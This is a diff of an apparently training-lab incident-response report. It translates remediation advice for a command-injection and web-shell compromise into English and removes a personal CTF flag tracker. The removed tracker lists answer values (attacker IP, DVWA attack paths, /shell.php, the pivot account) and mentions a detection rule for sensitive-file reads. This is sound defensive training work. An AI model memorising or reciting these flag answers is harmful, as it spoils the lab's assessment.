+3. **Fix the root cause.** The diagnostic page (ping tool and file viewer) passes user input straight to the OS via `system()`. Either remove these features if they are not business-critical, or rewrite them to never pass user input to a shell: use native libraries (application-level ping, strict allowlist file reads) and validate input against an allowlist, with no shell metacharacters permitted.
 
-4. **Deploiement de la detection.** Mettre en production les cinq regles Suricata de la Section 6, en remplacant `content:"any"` par des variables reseau correctement scopees au segment protege, et en affinant la regle 1000001 (`etc` trop large) vers un contexte de chemin systeme. Alerter le SOC sur tout match.
+4. **Deploy detection.** Put the five Suricata rules from Section 6 into production, replacing `content:"any"` with network variables correctly scoped to the protected segment, and tightening rule 1000001 (`etc` too broad) toward a system path context. Alert the SOC on any match.
 
-5. **Durcissement de fond.** Appliquer le principe de moindre privilege au compte `www-data` (pas d'ecriture dans le webroot en production). Segmenter le serveur web du reste du reseau interne pour limiter le pivot lateral. Reauditer bru-web-01 apres INC-2026-004 (SQLi sur le meme hote) : deux vulnerabilites d'injection distinctes sur la meme machine en quelques jours indiquent un besoin de revue de code applicative complete.
-
----
-
-## 8. CTF flag tracker (Phase 1 + Phase 2)
-
-> [Usage perso : coche au fur et a mesure de la soumission sur la plateforme. NE PAS inclure dans le livrable final remis a NexaCorp.]
-
-### LAB05 Phase 1 : Investigation
-
-| Flag | Points | Source | Valeur | Soumis |
-|---|---|---|---|---|
-| Who is knocking? | 50 | access log (IP attaquant) | `172.16.50.10` | [x] |
-| Command injection path | 75 | access log | `/dvwa/vulnerabilities/exec/` | [x] |
-| LFI attack path | 75 | access log | `/dvwa/vulnerabilities/fi/` (sinon avec `?page=`) | [x] |
-| First injection timestamp | 100 | access log (pas Wazuh) | `05/Jun/2026:11:11:59 +0200` (sinon `11:11:59`) | [x] |
-| Running as who? | 100 | pcap, follow stream 3066 | `www-data` | [x] |
-| The persistence artifact | 125 | access log + pcap | `/shell.php` (sinon `shell.php`) | [x] |
-| The pivot account | 150 | auth.log | `j.martin` | [x] |
-
-### LAB05 Phase 2 : Suricata Detection
-
-| Flag | Points | Valeur | Soumis |
-|---|---|---|---|
-| Sensitive file targeting | 200 | `1` | [x] |
-| Web shell : deployment vs usage | 200 | `4` (plateforme ; offline deterministe = 2) | [x] |
-| Catching the web shell write | 250 | `1` | [x] |
-| RCE confirmed : response-side detection | 300 | `6` | [x] |
-| Data exfiltration in the response | 350 | `1` | [x] |
+5. **Baseline hardening.** Apply least privilege to the `www-data` account (no write access to the webroot in production). Segment the web server from the rest of the internal network to limit lateral pivoting. Re-audit bru-web-01 after INC-2026-004 (SQLi on the same host): two distinct injection vulnerabilities on the same machine within a few days point to a need for a full application code review.
 
 ---
 
-*BeCode Corp : Incident Response Division*
-*Classification: Confidential : Do not distribute outside BeCode Corp*
+*BeCode Corp, Incident Response Division*
+*Classification: Confidential, do not distribute outside BeCode Corp*
